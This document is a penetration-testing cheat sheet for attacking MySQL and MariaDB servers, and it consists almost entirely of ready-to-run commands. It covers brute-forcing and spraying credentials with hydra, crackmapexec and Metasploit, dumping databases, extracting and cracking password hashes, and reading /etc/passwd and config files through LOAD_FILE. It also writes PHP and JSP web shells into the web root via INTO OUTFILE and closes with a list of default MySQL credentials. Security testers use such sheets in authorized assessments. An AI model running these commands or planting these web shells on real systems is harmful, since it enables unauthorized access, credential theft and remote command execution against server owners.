# MySQL / MariaDB — TCP/3306

## Detection

### nmap
```
nmap -p 3306 -sV <IP>
nmap -p 3306 --script mysql-info <IP>
```

## Banner Grabbing

### netcat
```
nc -nv <IP> 3306
```

### telnet
```
telnet target.com 3306
```


## Authentication Testing

### Credential Validation
```
crackmapexec mysql <IP> -u users.txt -p passwords.txt

```

### Password Spray
```
crackmapexec mysql <IP> -u users.txt -p 'Password123'
```

### Brute Force

#### hydra
```
hydra -L users.txt -P passwords.txt <IP> mysql
```


#### nmap
```
nmap -p 3306 --script mysql-brute <IP>
```

## Connect

### mysql Client

#### Local connection (no password)
```
mysql -u root
```
#### Local connection with password
```
mysql -u username -p
```

#### Connect to specific database
```
mysql -u username -p database_name
```

#### Remote connection
```
mysql -u username -h target.com -P 3306 -p
```

#### Connect and execute query
```
mysql -u username -p -e "SELECT @@version;"
```

#### Connect without database selection
```
mysql -u username -h target.com -p --skip-database
```

### msqldump

#### Dump specific database
mysqldump -u username -p database_name > backup.sql

#### Dump all databases
mysqldump -u username -p --all-databases > all_databases.sql

#### Dump specific table
```
mysqldump -u username -p database_name table_name > table.sql
```
#### Remote dump
```
mysqldump -u username -h target.com -p database_name > remote_backup.sql
```

## In-Database Enumeration

### MySQL Version
```
SELECT @@version;
SELECT VERSION();
```
### Server Information
```
SELECT @@version_compile_os;
SELECT @@version_compile_machine;
```
### Detailed version info
```
SHOW VARIABLES LIKE "%version%";
```

### List All Databases
```
SHOW DATABASES;
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;
```

### Current Database
```
SELECT DATABASE();
```

### List MySQL Users
```
SELECT user, host FROM mysql.user;
```

### Current User
```
SELECT USER();
SELECT CURRENT_USER();
```

### User privileges
```
SHOW GRANTS;
SHOW GRANTS FOR 'username'@'host';
```

### List users with FILE privilege
```
SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
```

### List users with SUPER privilege
```
SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
```

### List tables in current database
```
SHOW TABLES;
SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE();
```

### List columns in specific table
```
SHOW COLUMNS FROM table_name;
SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';
```

### Describe Table
```
DESCRIBE users;
```

### Dump Table Contents
```
SELECT * FROM users;
```

### Search For Credentials
```
SELECT * FROM users WHERE password IS NOT NULL;
```

## Privilege Enumeration

### Current user privileges
```
SHOW GRANTS FOR CURRENT_USER();
SELECT * FROM information_schema.USER_PRIVILEGES WHERE grantee LIKE '%username%';
```

### All Users
```
SELECT user, host FROM mysql.user;
```

### Check FILE Privilege (for LOAD_FILE/INTO OUTFILE)
```
SELECT file_priv FROM mysql.user WHERE user='current_user';
```

### Check For Dangerous Permissions
```
SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv, 
       Create_priv, Drop_priv, File_priv, Super_priv 
FROM mysql.user;
```

## High-Value Abuse Paths

### Write Web Shell

#### PHP Webshell
```
SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE '/var/www/html/shell.php';
```

#### More Sophisticated Webshell
```
SELECT '<?php
if(isset($_REQUEST["cmd"])){
    $cmd = $_REQUEST["cmd"];
    echo "<pre>";
    $result = shell_exec($cmd);
    echo $result;
    echo "</pre>";
}
?>' INTO OUTFILE '/var/www/html/advanced-shell.php';
```

#### JSP Webshell 
```
SELECT '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' 
INTO OUTFILE '/var/www/html/shell.jsp';
```

### MySQL -> OS Command Execution
```
SHOW VARIABLES LIKE 'secure_file_priv';
```

### Credential Re-use / Pivoting
#### Extract Password Hashes
```
SELECT user, password FROM mysql.user;
SELECT user, authentication_string FROM mysql.user;
mysql -u root -p -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user" > mysql_hashes.txt
```

#### Crack with
```
hashcat -m 300 hashes.txt rockyou.txt # MySQL 4.1/MySQL 5+
john --format=mysql-sha1 mysql_hashes.txt
hashcat -m 200 old_mysql_hash.txt rockyou.txt # pre-4.1
```

## Metasploit MySQL Assessment
### Detect MySQL Version
```
use auxiliary/scanner/mysql/mysql_version
set RHOSTS target.com
run
```

### Enumerate Users and Privileges
```
use auxiliary/admin/mysql/mysql_enum
set RHOSTS target.com
set USERNAME root
set PASSWORD password
run
```

### Dump Database Schema
```
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS target.com
set USERNAME root
set PASSWORD password
run
```
### Extract Password Hashes
```
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS target.com
set USERNAME root
set PASSWORD password
run
```

### Brute Force Credentials
```
use auxiliary/scanner/mysql/mysql_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

## Post-Exploitation

### Read Files From Server
```
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\Windows\\win.ini');

# Read file with hex encoding (bypasses binary issues)
SELECT HEX(LOAD_FILE('/etc/passwd'));
```

### Write Files To Server
```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT 'backdoor content' INTO OUTFILE '/tmp/backdoor.txt';
```

### Check File Operation Restrictions
```
SHOW VARIABLES LIKE 'secure_file_priv';
```

## Common MySQL Credentials (seclists/passwords/default-credentials/mysql-betterdefaultpasslist)
```
root:mysql
root:root
root:chippc
admin:admin
root:
root:nagiosxi
root:usbw
cloudera:cloudera
root:cloudera
root:moves
moves:moves
root:testpw
root:p@ck3tf3nc3
mcUser:medocheck123
root:mktt
root:123
dbuser:123
asteriskuser:amp109
asteriskuser:eLaStIx.asteriskuser.2oo7
root:raspberry
root:openauditrootuserpassword
root:vagrant
root:123qweASD#
```